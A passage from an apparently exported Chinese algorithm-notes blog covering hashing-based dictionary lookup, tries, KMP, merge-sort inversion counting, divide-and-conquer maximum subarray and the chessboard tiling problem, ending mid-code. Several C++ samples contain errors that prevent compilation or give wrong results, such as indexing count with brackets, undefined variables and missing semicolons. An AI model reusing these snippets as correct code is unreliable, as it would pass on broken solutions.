<p><img src="/2023/12/02/%E7%AE%97%E6%B3%95-%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E4%BD%BF%E7%94%A8/image-4.png"></p>
<p>这里内存和时间都卡的很死, 思路是使用双重哈希, 具体做法是用一个 <code>vector</code> 数组顺序保存词典索引和词典内容, 然后用 <code>map</code> 去记录对应 hash 的下标. 因为 <code>map</code> 里面是红黑树, 如果直接存映射会爆内存的.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getHash</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 注意这里是 longlong 防止溢出</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> base=<span class="number">65337</span>;</span><br><span class="line">    <span class="type">int</span> mod = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        res = (res*base+(s[i]-<span class="string">&#x27;a&#x27;</span>)) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;hash2pos;</span><br><span class="line">    vector&lt;string&gt; dicts;</span><br><span class="line">    string str;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">getline</span>(cin,str)&amp;&amp; str!=<span class="string">&quot;@END@&quot;</span>)&#123;</span><br><span class="line">        <span class="type">int</span> pos = str.<span class="built_in">find</span>(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">        string dict = str.<span class="built_in">substr</span>(<span class="number">0</span>,pos+<span class="number">1</span>);</span><br><span class="line">        string fun = str.<span class="built_in">substr</span>(pos+<span class="number">2</span>,str.<span class="built_in">length</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="type">int</span> dict_hash = <span class="built_in">getHash</span>(dict);</span><br><span class="line">        <span class="type">int</span> fun_hash = <span class="built_in">getHash</span>(fun);</span><br><span class="line">        <span class="comment">// 将 dict 和 function 存入 vector 数组</span></span><br><span class="line">        dicts.<span class="built_in">push_back</span>(dict);</span><br><span class="line">        dicts.<span class="built_in">push_back</span>(fun);</span><br><span class="line">        <span class="comment">// 用 map 存 vector 的数组索引</span></span><br><span class="line">        hash2pos[dict_hash] = dicts.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        hash2pos[fun_hash] = dicts.<span class="built_in">size</span>()<span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">        cin&gt;&gt;str;</span><br><span class="line">        <span class="type">int</span> hashvalue = <span class="built_in">getHash</span>(str);</span><br><span class="line">        <span class="keyword">if</span>(str[<span class="number">0</span>]=<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hash2pos.count[hashvalue]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                cout&lt;&lt;dict[hash2pos[hashvalue]]&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;what?&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(hash2pos.count[hashvalue]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                string res = dicts[hash2pos[hashvalue]];</span><br><span class="line">                <span class="comment">// 去掉方括号</span></span><br><span class="line">                res = res.<span class="built_in">substr</span>(<span class="number">1</span>,res.<span class="built_in">size</span>()<span class="number">-2</span>);</span><br><span class="line">                cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;what?&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>STL</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】字符串</title>
    <url>/2023/12/27/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="【算法】字符串"><a href="#【算法】字符串" class="headerlink" title="【算法】字符串"></a>【算法】字符串</h1><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>c 中读取字符的函数为 <code>getchar()</code> ，他会读取任意单个输入的字符，用法 <code>char ch; ch = getchar()</code>。读取字符串的函数为 <code>gets()</code> 和 <code>cin.getline()</code>，它允许输入的字符串中存在空格，但不允许存在回车，因为<code>gets()</code>不会检查缓冲区溢出，所以是不安全的，在 C11 标准中已经被移除，<code>getline()</code>是 c++ 中的方法，相对安全。</p>
<p>一些常用的 <code>string</code> 类的库函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string str = <span class="string">&quot;you are us&quot;</span>;</span><br><span class="line"><span class="comment">//查找字符串</span></span><br><span class="line"><span class="keyword">if</span>((pos = str.<span class="built_in">find</span>(<span class="string">&quot;you&quot;</span>))!=<span class="number">-1</span>)&#123;</span><br><span class="line">    cout&gt;&gt;<span class="built_in">strlen</span>(str); <span class="comment">// 返回长度</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="function">string <span class="title">s</span><span class="params">(<span class="string">&quot;12345asdf&quot;</span>)</span></span>;</span><br><span class="line"><span class="comment">//获得字符串s中从第0位开始的长度为5的字符串</span></span><br><span class="line">string a = s.<span class="built_in">substr</span>(<span class="number">0</span>,<span class="number">5</span>);</span><br></pre></td></tr></table></figure>

<h2 id="字典树"><a href="#字典树" class="headerlink" title="字典树"></a>字典树</h2><p>字典树是一个树形数据结构，以模拟字典的形式查找字符串，字典树常用于<strong>搜索引擎，代码补全，搜索补全，词频统计</strong>等领域</p>
<div style="text-align: center;">
    <img src="image.png" width="360" height="300">
</div>

<p>使用<strong>先序遍历</strong>来匹配给定字符串进行查询，插入、查询复杂度都是$O(m)$，$m$为字符串长度，有公共前缀的字符串可以一起存，节约了内存空间。</p>
<p>例题</p>
<p><img src="/2023/12/27/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2/image-1.png"></p>
<p>后面的一连串提问，就是前缀匹配的问题，可以使用字典树去解决，为这些单词共同维护一个字典，然后在查询前缀的时候，返回终点后的叶子节点数，就能获得前缀单词的数量。</p>
<p>有个小细节就是，每次插入的过程中，对于同一前缀的词，他都一定会经过前缀的最后一个字符节点，每次经过就让那个字符节点的叶子数+1，就不用每次去遍历获取叶子节点了。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">5e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> charsize = <span class="number">26</span>;</span><br><span class="line"><span class="type">int</span> nxt[maxn+<span class="number">1</span>][charsize]; <span class="comment">//字典树</span></span><br><span class="line"><span class="type">int</span> total[maxn+<span class="number">1</span>]; <span class="comment">//记录叶子节点数</span></span><br><span class="line"><span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> s[],<span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> now = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="type">int</span> x = s[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!nxt[now][x])&#123;</span><br><span class="line">            nxt[now][x] = ++cnt;</span><br><span class="line">        &#125;</span><br><span class="line">        now = nxt[now][x];</span><br><span class="line">        total[now]++; <span class="comment">//说明有一个单词经过了这个前缀，计数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">search</span><span class="params">(<span class="type">char</span> s[],<span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> now = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="type">int</span> x = s[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!nxt[now][x])&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        now = nxt[now][x];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total[now];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">11</span>];</span><br><span class="line">    <span class="keyword">while</span>(cin.<span class="built_in">getline</span>(str))&#123;</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">        <span class="keyword">if</span>(!len) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">insert</span>(str,len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(cin,<span class="built_in">getline</span>(str))&#123;</span><br><span class="line">        cout&lt;&lt;<span class="built_in">search</span>(str,<span class="built_in">strlen</span>(str))&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h2><p>KMP 算法是一个单模式匹配算法，是目前能够达到的最优的模式匹配算法，它的算法复杂度为 $O(m+n)$，其中$m$为匹配字符串长度，$n$为待匹配字符串长度。</p>
<p>KMP 算法分为两个核心步骤：</p>
<ol>
<li>找到匹配字符串的最大公共前后缀，计算 <code>next</code> 数组</li>
<li>按照 <code>next</code> 数组跳转进行模式匹配</li>
</ol>
<h3 id="计算-next-数组"><a href="#计算-next-数组" class="headerlink" title="计算 next 数组"></a>计算 next 数组</h3><p>简单上来讲，就是找<strong>最大的公共前后缀</strong>，然后由前缀部分跳转到后缀部分，整个 <code>next</code> 数组就是开一个数组去记录当匹配到了当前字符时，如果出现失配，应该从开头跳转到哪个字符。</p>
<p><img src="/2023/12/27/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2/image-2.png"></p>
<p>求 <code>next</code> 数组，先从左往右遍历这个数组，然后去计算当前位置的最大公共前后缀，然后计算当前位的下一个位的 <code>next</code> 值（即要拿哪一位和下一位进行比较），如下图中，<code>i=5</code> 对应的最大公共前后缀长度为 3(ABA)，那么假设下一位发生失配，就要拿前缀 <code>ABA</code> 的下一个字符 <code>B</code> 来匹配。<br>所以 $next[i+1]&#x3D;index(B)&#x3D;3$</p>
<p><img src="/2023/12/27/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2/image-3.png"></p>
<p>思路比较简单，KMP 算法难就难在代码怎么写，求 <code>next</code> 数组可以看成是一个<strong>动态规划过程</strong>，因为现在的公共前后缀<strong>都是前面的公共前后缀加上来的</strong>，用下面这张图理解</p>
<p><img src="/2023/12/27/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2/image-4.png"></p>
<p>如果当前的 <code>next</code> 配对上了，<code>next[i+1]</code> 直接加 1 就好，如果没配对上，就要<strong>找他上一次的最大前缀</strong>，然后再看能不能配对上，循环这个过程直到配对上了或者回到了起点。</p>
<p>例题</p>
<p><img src="/2023/12/27/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2/image-5.png"></p>
<p>以这道例题给 KMP 算法的标程</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string p,s;</span><br><span class="line"><span class="type">int</span> nxt[<span class="number">1000010</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin&gt;&gt;s&gt;&gt;p;</span><br><span class="line">    nxt[<span class="number">0</span>],nxt[<span class="number">1</span>]=<span class="number">0</span>; <span class="comment">//初始化</span></span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>; <span class="comment">//用来记录目前到了哪一组最大前后缀</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;p.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="comment">// 如果没配对上，就找上一组，看看能不能配对上</span></span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; p[i]!=p[j]) j = nxt[j];</span><br><span class="line">        <span class="comment">// 如果配对上了，就+1，没配对上就赋值 0</span></span><br><span class="line">        nxt[i+<span class="number">1</span>] = (p[i]==p[j]) ? ++j:<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    j = <span class="number">0</span>; <span class="comment">//j为匹配串的位置</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        <span class="comment">// 失配了，根据 next 数组跳转</span></span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; s[i]!=p[j]) j = nxt[j];</span><br><span class="line">        j+=(s[i]==p[j])? <span class="number">1</span> : <span class="number">0</span>; <span class="comment">//如果匹配上了就加 1</span></span><br><span class="line">        <span class="keyword">if</span>(j==p.<span class="built_in">size</span>())&#123;</span><br><span class="line">            cout&lt;&lt;i-p.<span class="built_in">size</span>()+<span class="number">2</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=p.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">        cout&lt;&lt;nxt[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个代码中 <code>j = nxt[j]</code> 就会将上一组最大前缀要匹配的下一个字符的下标赋给 <code>j</code>，也就是下图中的 3</p>
<p><img src="/2023/12/27/%E7%AE%97%E6%B3%95-%E5%AD%97%E7%AC%A6%E4%B8%B2/image-6.png"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>KMP</tag>
        <tag>字典树</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】分治算法</title>
    <url>/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="【算法】分治算法"><a href="#【算法】分治算法" class="headerlink" title="【算法】分治算法"></a>【算法】分治算法</h1><p>分治算法通过递归分解大问题为若干个子问题, 解决每个子问题后合并各个子问题, 直到合并为原来的大问题.</p>
<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p>归并排序是经典的分治解决问题的算法, 通过分解数组, 递归求解, 合并排序这三个步骤对数组排序.</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image.png"></p>
<p>先分析归并排序的复杂度, 由于每次合并需要遍历所有数组, 共 $n$ 次, 然后需要遍历每一层, 一共有 $log_2n$ 层, 所以归并排序的复杂度为 $O(nlogn)$ , 是稳定的排序算法.</p>
<p>由于归并过程允许我们对每一个子问题操作, 所以归并排序可以解决很多问题, 以一道题目为例:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-1.png"></p>
<p>这道题在合并过程中, 可以通过合并右边那部分数组的<strong>移位差</strong>来获得逆序对的个数, 比如 5 和 4 合并时, 4 从第 1 位移到了第 0 位, 所以逆序对个数+1, 同理 45 和 26 合并时, 2 从第 2 位移到了第 0 位, 逆序对+2… 这里由于只有右半部分会产生逆序对, 需要定义一个 <code>mid</code> 变量去获取归并时的中间值,确保<strong>只对左半部分求移位差</strong>, 如下图:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-2.png"></p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> num[<span class="number">500010</span>];</span><br><span class="line"><span class="type">int</span> tmp[<span class="number">500010</span>];</span><br><span class="line"><span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> mid, <span class="type">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = start;</span><br><span class="line">    <span class="type">int</span> j = mid+<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=end)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num[i]&gt;num[j])&#123;</span><br><span class="line">            tmp[idx++] = num[j++];</span><br><span class="line">            res += mid-i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tmp[idx++]=num[i++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)&#123;</span><br><span class="line">        tmp[idx++]=num[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=end)&#123;</span><br><span class="line">        tmp[idx++]=num[j++];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(start&gt;=end)&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> mid = (start+end)/<span class="number">2</span></span><br><span class="line">    <span class="built_in">merge_sort</span>(start, mid);</span><br><span class="line">    <span class="built_in">merge_sort</span>(mid+<span class="number">1</span>,end);</span><br><span class="line">    <span class="built_in">merge</span>(start,mid,end);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=start;i&lt;=end;i++)&#123;</span><br><span class="line">        num[i]=tmp[i-start];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;num[i];</span><br><span class="line">    &#125;</span><br><span class="line">    res = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">merge_sort</span>(<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    cout&lt;&lt;res&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="分治法求解最大和子序列"><a href="#分治法求解最大和子序列" class="headerlink" title="分治法求解最大和子序列"></a>分治法求解最大和子序列</h2><p>例题:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-3.png"></p>
<p>这道题与上一章暴力求解法的是一道题, 这次采用分治法去求解, 在这里, 大问题是求整个数组的最大子序列和, 我们将这个问题分成多个区间去求解, 即就是求每个区间的最大子序列和, 然后再在合并的时候去判断怎么获得最大子序列和.</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-4.png"></p>
<p>合并的时候要算 3 种情况:</p>
<ul>
<li>$S1$ 为左半部分的最大子序列和</li>
<li>$S2$ 为右半部分的最大子序列和</li>
<li>$S3$ 为合并后包括 <code>mid</code> 和 <code>mid+1</code> 这两个元素的最大子序列和, 这里要针对 <code>mid</code> 往左找最大子序列和, 针对 <code>mid+1</code>往右找最大子序列和, 因为已经分别固定了开头, 所以这个查找就很简单, 直接线性遍历并记录最大值就好就好.</li>
</ul>
<p>最后求解 $max{S1,S2,S3}$, 就是合并后的最优解了.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> left,right,sum;</span><br><span class="line">    <span class="built_in">node</span>(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> s):</span><br><span class="line">    <span class="built_in">left</span>(l),<span class="built_in">right</span>(r),<span class="built_in">sum</span>(s)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">node <span class="title">merge_func</span><span class="params">(<span class="type">int</span> low,<span class="type">int</span> mid,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="function">node <span class="title">merge</span><span class="params">(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max_left = <span class="number">-10000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=mid;i&gt;=low;i--)&#123;</span><br><span class="line">        sum+=a[i];</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;max_left)&#123;</span><br><span class="line">            max_left = sum;</span><br><span class="line">            merge.left = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max_right = <span class="number">-10000</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=mid+<span class="number">1</span>;i&lt;=high;i++)&#123;</span><br><span class="line">        sum+=a[i];</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;max_right)&#123;</span><br><span class="line">            max_right = sum;</span><br><span class="line">            merge.right = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;max_left&lt;&lt;&quot; &quot;&lt;&lt;max_right&lt;&lt;endl;</span></span><br><span class="line">    merge.sum = max_left + max_right;</span><br><span class="line">    <span class="keyword">return</span> merge;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">node <span class="title">merge1</span><span class="params">(<span class="type">int</span> low,<span class="type">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(low==high)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">node</span>(low,high,a[low]);</span><br><span class="line">    <span class="type">int</span> mid = (low+high)/<span class="number">2</span>;</span><br><span class="line">    node n1 = <span class="built_in">merge1</span>(low,mid);</span><br><span class="line">    node n2 = <span class="built_in">merge1</span>(mid+<span class="number">1</span>,high);</span><br><span class="line">    node n3 = <span class="built_in">merge_func</span>(low, mid, high);</span><br><span class="line">    <span class="keyword">if</span>(n1.sum&gt;=n2.sum &amp;&amp; n1.sum&gt;=n3.sum)&#123;</span><br><span class="line">        <span class="keyword">return</span> n1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n2.sum&gt;=n1.sum &amp;&amp; n2.sum&gt;=n3.sum)&#123;</span><br><span class="line">        <span class="keyword">return</span> n2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> n3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="type">int</span> case_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(a, <span class="number">0</span>, <span class="built_in">sizeof</span>(a));</span><br><span class="line">        <span class="type">int</span> m;</span><br><span class="line">        cin&gt;&gt;m;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            cin&gt;&gt;a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        node ans = <span class="built_in">merge1</span>(<span class="number">0</span>, m<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(case_num)</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case &quot;</span>&lt;&lt;++case_num&lt;&lt;<span class="string">&quot;:&quot;</span>&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;ans.sum&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ans.left+<span class="number">1</span>&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ans.right+<span class="number">1</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="分治法求解棋盘问题"><a href="#分治法求解棋盘问题" class="headerlink" title="分治法求解棋盘问题"></a>分治法求解棋盘问题</h2><p>题目:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-5.png"></p>
<p>这道题别被他的三角形骗了, 实际上使用分治做的, 将棋盘分割成四部分, 因为肯定有一个部分存在特殊方格, 另外三个部分在中心部分填如三角形即可, 示意图如下:</p>
<p><img src="/2023/12/04/%E7%AE%97%E6%B3%95-%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95/image-6.png"></p>
<p>对于有特殊方块的区域, 就继续按照特殊方块分治, 对于没有特殊方块的区域, 就把用三角形填入的那个一个方格当成特殊方块, 继续分治.</p>
<p>代码为:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> board[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line"><span class="comment">// c, r 是起始点的横纵坐标, x,y 是特殊方格的横纵坐标, s 是当前棋盘的 size</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">chessboard</span><span class="params">(<span class="type">int</span> c, <span class="type">int</span> r, <span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(size==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> cnt = ++num;</span><br><span class="line">    <span class="type">int</span> s = size/<span class="number">2</span>; 